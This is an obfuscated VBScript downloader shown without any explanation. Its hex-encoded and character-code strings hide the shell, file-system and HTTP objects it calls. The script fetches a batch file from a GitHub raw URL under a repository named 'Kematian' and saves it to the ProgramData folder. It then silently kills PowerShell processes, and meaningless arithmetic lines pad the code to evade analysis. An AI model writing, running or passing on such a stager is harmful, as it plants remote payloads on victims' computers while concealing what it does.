On Error Resume Next
Randomize:Dim x1,x2,x3,x4,x5,x6,x7,x8,x9,x10,x11,x12,x13,x14,x15,f1,f2,f3,f4,f5
Function d1(s):For i=1 To Len(s) Step 2:d1=d1&Chr(CLng("&H"&Mid(s,i,2))):Next:End Function
Function d2(n):d2=Chr(n):End Function
x1=d1("5753637269707446536865526C")
x2=d1("53637269707469526E674654696C6553797374656D4F626A656374")
x3=Int((10000-1000+1)*Rnd+1000)
Set x4=CreateObject(d2(87)&d2(83)&d2(99)&d2(114)&d2(105)&d2(112)&d2(116)&d2(46)&d2(83)&d2(104)&d2(101)&d2(108)&d2(108))
x5=Int((5000-500+1)*Rnd+500)
Set x6=CreateObject(d2(83)&d2(99)&d2(114)&d2(105)&d2(112)&d2(116)&d2(105)&d2(110)&d2(103)&d2(46)&d2(70)&d2(105)&d2(108)&d2(101)&d2(83)&d2(121)&d2(115)&d2(116)&d2(101)&d2(109)&d2(79)&d2(98)&d2(106)&d2(101)&d2(99)&d2(116))
x7=x4.ExpandEnvironmentStrings(d2(37)&d2(80)&d2(114)&d2(111)&d2(103)&d2(114)&d2(97)&d2(109)&d2(68)&d2(97)&d2(116)&d2(97)&d2(37))
f1=Int((100-10+1)*Rnd+10)
x8=x7&d2(92)&d2(100)&d2(97)&d2(116)&d2(97)&d2(46)&d2(98)&d2(97)&d2(116)
f2=x3+x5
x9=d1("68747470733A2F2F7261772E67697468756275736572636F6E74656E742E636F6D2F62617432657865")
x9=x9&d1("2F4B656D617469616E2F726566732F686561")
x9=x9&d1("64732F6D61696E2F642E626174")
f3=f1*2
If x6.FileExists(x8) Then
x6.DeleteFile x8,True
End If
f4=f2-f3
x10=d2(77)&d2(83)&d2(88)&d2(77)&d2(76)&d2(50)&d2(46)&d2(83)&d2(101)&d2(114)&d2(118)&d2(101)&d2(114)&d2(88)&d2(77)&d2(76)&d2(72)&d2(84)&d2(84)&d2(80)&d2(46)&d2(54)&d2(46)&d2(48)
Set x11=CreateObject(x10)
x11.Open d2(71)&d2(69)&d2(84),x9,False
f5=f4+f3
x11.Send
If x11.Status=200 Then
Dim y1,y2,y3,y4,y5,y6
y1=d2(65)&d2(68)&d2(79)&d2(68)&d2(66)&d2(46)&d2(83)&d2(116)&d2(114)&d2(101)&d2(97)&d2(109)
y2=Int((999-100+1)*Rnd+100)
Set y3=CreateObject(y1)
y3.Type=1
y3.Open
y4=y2*3
y3.Write x11.ResponseBody
y3.SaveToFile x8,2
y5=y4-y2
y3.Close
y6=y5+y2
Set y3=Nothing
End If
x12=d2(116)&d2(97)&d2(115)&d2(107)&d2(107)&d2(105)&d2(108)&d2(108)&d2(32)&d2(47)&d2(70)&d2(32)&d2(47)&d2(73)&d2(77)&d2(32)&d2(112)&d2(111)&d2(119)&d2(101)&d2(114)&d2(115)&d2(104)&d2(101)&d2(108)&d2(108)&d2(46)&d2(101)&d2(120)&d2(101)
x13=Int((50-1+1)*Rnd+1)
x4.Run x12,0,False
x14=x13*2
Set x11=Nothing
Set x6=Nothing
x15=x14-x13
Set x4=Nothing
